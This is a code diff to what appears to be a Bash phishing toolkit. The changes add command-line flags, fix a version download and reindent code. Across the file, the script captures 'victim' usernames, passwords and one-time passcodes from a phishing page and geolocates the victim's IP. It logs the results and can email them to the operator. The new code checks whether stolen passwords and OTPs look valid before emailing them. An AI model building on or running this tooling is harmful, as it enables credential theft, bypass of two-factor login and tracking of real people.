@@ -87,6 +87,28 @@ sbanner(){
 	echo -e "${NC} "
 }
 
+args(){
+        if [ "$1" == "--version" ] || [ "$1" == "-v" ]; then
+                if [[ -e "${update_dir}/version.txt" ]]; then
+                        version=$( cat ${update_dir}/version.txt )
+                        echo -ne "${version}"  # Replace with the actual version number
+                        exit 0
+                fi
+        fi
+        if [ "$1" == "--banner" ] || [ "$1" == "-b" ]; then
+                banner
+                exit 0
+        fi
+        if [ "$1" == "--credits-banner" ] || [ "$1" == "-cb" ]; then
+                cbanner
+                exit 0
+        fi
+        if [ "$1" == "--small-banner" ] || [ "$1" == "-sb" ]; then
+                sbanner
+                exit 0
+        fi
+}
+
 colorcodes(){
     if [[ ! -e "${assets_dir}/colorcodes.sh" ]]; then
         wget --no-check-certificate https://gist.githubusercontent.com/NeerajCodz/bfcc3cd84f1fd04ebfb9c8c96fa70c79/raw/2e3233fabf6b298d2d271b638763079ad3eef9d9/colorcodes.sh > /dev/null 2>&1
@@ -163,8 +185,8 @@ directories(){
         fi
         if [[ ! -e "${update_dir}/version.txt" ]]; then
                 wget --no-check-certificate ${link_clifty_raw}/assets/update/version.txt > /dev/null 2>&1
-                mv update.txt ${update_dir}
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded update.txt"
+                mv version.txt ${update_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded version.txt"
         fi
         if [[  ! -e "${fetch_dir}/ip.php" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/ip.php > /dev/null 2>&1
@@ -293,14 +315,13 @@ update(){
 	status
 	if [ $plainnetstats == "online" ]; then
                 { clear; banner; }
-                lat_ver=$( cat ${update_dir}/version.txt )
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Updating ( Version: ${lat_ver} ) ${NC} "
+                version=$( cat ${update_dir}/version.txt )
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Updating ( Version: ${version} ) ${NC} "
 		cd ${pro_dir}
-                lat_ver=$( cat ${update_dir}/version.txt )
                 git reset --hard
                 git pull
                 echo -e " "
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${version} ) ${NC} "
                 sleep 2
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${MAGENTA} RESTARTING THE TOOL!!${NC} "
                 cd ${pro_dir}
@@ -1756,6 +1777,8 @@ checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
 check_sendEmail() {
     status_display
     echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO GET AN EMAIL OF LOGS ${NF} : ${NA}"
+        echo -ne "\n${ITALICWHITE} NOTE : If your simply testing the tool, then please deny this.. ${NA}"
+        echo -ne "${ITALICYELLOW} If too much fake or test emails were found your email will be banned from tool ${NA}"
         echo -e "" 
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
         echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
@@ -1785,8 +1808,9 @@ input_email() {
     fi  
 }
 sendEmail() {
-    if [[ $plainnetstats="online" && -n "$server" && -n "$site" && -n "${victim_id[$index]}" && 
-        -n "${victim_pass[$index]}" && -n "${victim_otp[$index]}" && "${plainmyip}"!="${victim_ip[$index]}" ]]; then
+if [ "$plainnetstats" == "online" ] && [ -n "$server" ] && [ -n "$site" ] && [ -n "${victim_id[$index]}" ] &&
+   { [ "${victim_otp_valid[$index]}" == true ] || [ "${victim_otp[$index]}" == "NaN" ]; } &&
+   { [ "${victim_pass_valid[$index]}" == true ] || [ "${victim_pass[$index]}" == "NaN" ]; }; then
         if [[ ${GET_MAIL}=='Y' ||  ${GET_MAIL}=='y' ]]; then
             rm -rf "${email_dir}/email.json"
             cp "${email_dir}/template.json" "${email_dir}/email.json"
@@ -1976,9 +2000,9 @@ capture_ip() {
 ##	IP=$(awk -F 'IP: ' '{print $2}' ${www_dir}/ip.txt | xargs)
 	victim_ip[$index]="$IP"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM IP : ${BOLDWHITE}${victim_ip[$index]}${NA}"
-    cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
 	cat ${dumps_dir}/line.txt >> ${final_log_name}
-    cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
 	cat ${www_dir}/ip.txt >> ${final_log_name}
 	echo -ne "\n${CYAN}Saved IP address in Logs"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
@@ -2002,117 +2026,132 @@ capture_ip() {
 
 }
 ip_details() {
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} Trying to capture details of IP : ${RESETBG} ${victim_ip}${NA}"
-##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
-	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
-	sleep 2
-	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
-	iptt[$index]=$(sed -n 's/"ip"://p' track.txt)
-	if [[ ${iptt[$index]} != "" ]]; then
-		echo -e  "\n${GREEN} Device ip: ${BOLDWHITE} $iptt"
-	fi
-	ipstats[$index]=$(sed -n 's/"success"://p' track.txt)
-	if [[ ${ipsuccess[$index]} != "" ]]; then
+        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} Trying to capture details of IP : ${RESETBG} ${victim_ip}${NA}"
+        ##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
+        wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
+        sleep 2
+        grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
+        iptt[$index]=$(sed -n 's/"ip"://p' track.txt)
+        if [[ ${iptt[$index]} != "" ]]; then
+                echo -e  "\n${GREEN} Device ip: ${BOLDWHITE} $iptt"
+        fi
+        ipstats[$index]=$(sed -n 's/"success"://p' track.txt)
+        if [[ ${ipsuccess[$index]} != "" ]]; then
         echo -e  "\n${GREEN} IP details capturing: ${BOLDWHITE} $iptt"
-    fi
-	iptype[$index]=$(sed -n 's/"type"://p' track.txt)
-	if [[ ${iptype[$index]} != "" ]]; then
-		echo -e "${GREEN} IP type: ${BOLDWHITE} $iptype"
-	fi
-	latitude[$index]=$(sed -n 's/"latitude"://p' track.txt)
-	if [[ ${latitude[$index]} != "" ]]; then
-		echo -e  "${GREEN} Latitude:  ${BOLDWHITE} $latitude"
-	fi
-	longitude[$index]=$(sed -n 's/"longitude"://p' track.txt)
-	if [[ ${longitude[$index]} != "" ]]; then
-		echo -e  "${GREEN} Longitude:  ${BOLDWHITE} $longitude"
-	fi
-	city[$index]=$(sed -n 's/"city"://p' track.txt)
-	if [[ ${city[$index]} != "" ]]; then
-		echo -e "${GREEN} City: ${BOLDWHITE} $city"
-	fi
-	isp[$index]=$(sed -n 's/"isp"://p' track.txt)
-	if [[ ${isp[$index]} != "" ]]; then
-		echo -e "${GREEN} Isp: ${BOLDWHITE} $isp"
-	fi
-	country[$index]=$(sed -n 's/"country"://p' track.txt)
-	if [[ ${country[$index]} != "" ]]; then
-		echo -e  "${GREEN} Country: ${BOLDWHITE} $country"
-	fi
-	flag[$index]=$(sed -n 's/"country_flag"://p' track.txt)
-	if [[ ${flag[$index]} != "" ]]; then
-		echo -e "${GREEN} Country flag: ${BOLDWHITE} $flag"
-	fi
-	cap[$index]=$(sed -n 's/"country_capital"://p' track.txt)
-	if [[ ${cap[$index]} != "" ]]; then
-		echo -e "${GREEN} Country capital: ${BOLDWHITE} $cap"
-	fi
-	phon[$index]=$(sed -n 's/"country_phone"://p' track.txt)
-	if [[ ${phon[$index]} != "" ]]; then
-		echo -e "${GREEN} Country code: ${BOLDWHITE} $phon"
-	fi
-	continent[$index]=$(sed -n 's/"continent"://p' track.txt)
-	if [[ ${continent[$index]} != "" ]]; then
-		echo -e  "${GREEN} Continent:  ${BOLDWHITE} $continent"
-	fi
-	ccode[$index]=$(sed -n 's/"currency_code"://p' track.txt)
-	if [[ ${ccode[$index]} != "" ]]; then
-		echo -e "${GREEN} Currency code: ${BOLDWHITE} $ccode"
-	fi
-	region[$index]=$(sed -n 's/"region"://p' track.txt)
-	if [[ ${region[$index]} != "" ]]; then
-		echo -e "${GREEN} State: ${BOLDWHITE} $region"
-	fi
-    location="${city[$index]}, ${region[$index]}, ${country[$index]} ( ${latitude[$index]}, ${longitude[$index]} )"
-    victim_loc[$index]=$(echo "$location" | tr -d '"')
-    if [[ victim_loc[$index]==", ,  ( ,  )" ]]; then
+        fi
+        iptype[$index]=$(sed -n 's/"type"://p' track.txt)
+        if [[ ${iptype[$index]} != "" ]]; then
+                echo -e "${GREEN} IP type: ${BOLDWHITE} $iptype"
+        fi
+        latitude[$index]=$(sed -n 's/"latitude"://p' track.txt)
+        if [[ ${latitude[$index]} != "" ]]; then
+                echo -e  "${GREEN} Latitude:  ${BOLDWHITE} $latitude"
+        fi
+        longitude[$index]=$(sed -n 's/"longitude"://p' track.txt)
+        if [[ ${longitude[$index]} != "" ]]; then
+                echo -e  "${GREEN} Longitude:  ${BOLDWHITE} $longitude"
+        fi
+        city[$index]=$(sed -n 's/"city"://p' track.txt)
+        if [[ ${city[$index]} != "" ]]; then
+                echo -e "${GREEN} City: ${BOLDWHITE} $city"
+        fi
+        isp[$index]=$(sed -n 's/"isp"://p' track.txt)
+        if [[ ${isp[$index]} != "" ]]; then
+                echo -e "${GREEN} Isp: ${BOLDWHITE} $isp"
+        fi
+        country[$index]=$(sed -n 's/"country"://p' track.txt)
+        if [[ ${country[$index]} != "" ]]; then
+                echo -e  "${GREEN} Country: ${BOLDWHITE} $country"
+        fi
+        flag[$index]=$(sed -n 's/"country_flag"://p' track.txt)
+        if [[ ${flag[$index]} != "" ]]; then
+                echo -e "${GREEN} Country flag: ${BOLDWHITE} $flag"
+        fi
+        cap[$index]=$(sed -n 's/"country_capital"://p' track.txt)
+        if [[ ${cap[$index]} != "" ]]; then
+                echo -e "${GREEN} Country capital: ${BOLDWHITE} $cap"
+        fi
+        phon[$index]=$(sed -n 's/"country_phone"://p' track.txt)
+        if [[ ${phon[$index]} != "" ]]; then
+                echo -e "${GREEN} Country code: ${BOLDWHITE} $phon"
+        fi
+        continent[$index]=$(sed -n 's/"continent"://p' track.txt)
+        if [[ ${continent[$index]} != "" ]]; then
+                echo -e  "${GREEN} Continent:  ${BOLDWHITE} $continent"
+        fi
+        ccode[$index]=$(sed -n 's/"currency_code"://p' track.txt)
+        if [[ ${ccode[$index]} != "" ]]; then
+                echo -e "${GREEN} Currency code: ${BOLDWHITE} $ccode"
+        fi
+        region[$index]=$(sed -n 's/"region"://p' track.txt)
+        if [[ ${region[$index]} != "" ]]; then
+                echo -e "${GREEN} State: ${BOLDWHITE} $region"
+        fi
+        location="${city[$index]}, ${region[$index]}, ${country[$index]} ( ${latitude[$index]}, ${longitude[$index]} )"
+        victim_loc[$index]=$(echo "$location" | tr -d '"')
+        if [[ victim_loc[$index]==", ,  ( ,  )" ]]; then
         location="NaN"
         victim_loc[$index]="NaN"
-    fi
-    cat ${dumps_dir}/line.txt >> ${final_log_name}
-	cat ${dumps_dir}/space.txt >> ${final_log_name}
-	cat track.txt >> "${final_log_name}"
-    echo -ne "\n${CYAN}Saved track details in Logs"
-	rm -rf track.txt
-	rm -rf rawtrack.txt
+        fi
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat track.txt >> "${final_log_name}"
+        echo -ne "\n${CYAN}Saved track details in Logs"
+        rm -rf track.txt
+        rm -rf rawtrack.txt
 }
 
 ## Get credentials
 capture_id() {
-    raw_victim_id[$index]=$( cat ${www_dir}/usernames.txt)
-    victim_id[$index]=$(echo "${raw_victim_id[$index]}" | awk -F': ' '{print $2}')
-    echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM USERNAME : ${RESETBG}${NA}"
-	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${raw_victim_id[$index]}${RESETBG}${NA}"
-    echo -ne "\n${CYAN}Saved in Logs"
-	cat ${dumps_dir}/space.txt >> ${final_log_name}
-    cat ${dumps_dir}/line.txt >> ${final_log_name}
-	cat ${dumps_dir}/space.txt >> ${final_log_name}
-    cat ${www_dir}/usernames.txt >> ${final_log_name}
-	rm -rf ${www_dir}/usernames.txt
+        raw_victim_id[$index]=$( cat ${www_dir}/usernames.txt)
+        victim_id[$index]=$(echo "${raw_victim_id[$index]}" | awk -F': ' '{print $2}')
+        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM USERNAME : ${RESETBG}${NA}"
+        echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${raw_victim_id[$index]}${RESETBG}${NA}"
+        echo -ne "\n${CYAN}Saved in Logs"
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${www_dir}/usernames.txt >> ${final_log_name}
+        rm -rf ${www_dir}/usernames.txt
 }
 capture_pass() {
-	raw_victim_pass[$index]=$( cat "${www_dir}/pass.txt")
-    victim_pass[$index]=$(echo "${raw_victim_pass[$index]}" | awk -F': ' '{print $2}')
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM PASSWORD : ${RESETBG}${NA}"
-	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${raw_victim_pass[$index]}${RESETBG}${NA}"
-    echo -ne "\n${CYAN}Saved in Logs"
-    cat ${dumps_dir}/space.txt >> ${final_log_name}
-    cat ${dumps_dir}/line.txt >> ${final_log_name}
-	cat ${dumps_dir}/space.txt >> ${final_log_name}
-    cat ${www_dir}/pass.txt >> ${final_log_name}
-	rm -rf ${www_dir}/pass.txt
+        raw_victim_pass[$index]=$( cat "${www_dir}/pass.txt")
+        victim_pass[$index]=$(echo "${raw_victim_pass[$index]}" | awk -F': ' '{print $2}')
+        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM PASSWORD : ${RESETBG}${NA}"
+        echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${raw_victim_pass[$index]}${RESETBG}${NA}"
+        if [[ ${#victim_pass[$index]} -ge 4 && "${victim_pass[$index]}" =~ [[:alpha:]] && "${victim_pass[$index]}" =~ [[:digit:]] ]]; then
+                victim_pass_valid[$index]=true
+                echo -e "${RED}[${WHITE}-${RED}]${GREEN} Password looks valid! ${RESETBG}${NA}"
+        else
+                victim_pass_valid[$index]=false
+                echo -e "${RED}[${WHITE}-${RED}]${YELLOW} Password looks Invalid! ${RESETBG}${NA}"
+        fi
+        echo -ne "\n${CYAN}Saved in Logs"
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${www_dir}/pass.txt >> ${final_log_name}
+        rm -rf ${www_dir}/pass.txt
 }
 capture_otp() {
-	raw_victim_otp[$index]=$( cat "${www_dir}/otp.txt")
-    victim_otp[$index]=$(echo "${raw_victim_otp[$index]}" | awk -F': ' '{print $2}')
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM OTP : ${RESETBG}${NA}"
-	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${raw_victim_otp[$index]}${RESETBG}${NA}"
-    echo -ne "\n${CYAN}Saved in Logs"
-	cat ${dumps_dir}/space.txt >> ${final_log_name}
-    cat ${dumps_dir}/line.txt >> ${final_log_name}
-	cat ${dumps_dir}/space.txt >> ${final_log_name}
-    cat ${www_dir}/otp.txt >> ${final_log_name}
-	rm -rf ${www_dir}/otp.txt
+        raw_victim_otp[$index]=$( cat "${www_dir}/otp.txt")
+        victim_otp[$index]=$(echo "${raw_victim_otp[$index]}" | awk -F': ' '{print $2}')
+        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM OTP : ${RESETBG}${NA}"
+        echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${raw_victim_otp[$index]}${RESETBG}${NA}"
+        otp_pattern="^[0-9]{2,}$"
+        if [[ "${victim_otp[$index]}" =~ $otp_pattern ]]; then
+                victim_otp_valid[$index]=true
+                echo -e "${RED}[${WHITE}-${RED}]${GREEN} OTP looks valid! ${RESETBG}${NA}"
+        else
+                victim_otp_valid[$index]=false
+                echo -e "${RED}[${WHITE}-${RED}]${YELLOW} OTP looks Invalid! ${RESETBG}${NA}"
+        fi
+        echo -ne "\n${CYAN}Saved in Logs"
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${www_dir}/otp.txt >> ${final_log_name}
+        rm -rf ${www_dir}/otp.txt
 }
 capture_img(){
     while true; do
@@ -4167,6 +4206,7 @@ login_pattern(){
 }
 
 ##MAIN
+args "$@"
 clear
 colorcodes
 prompt
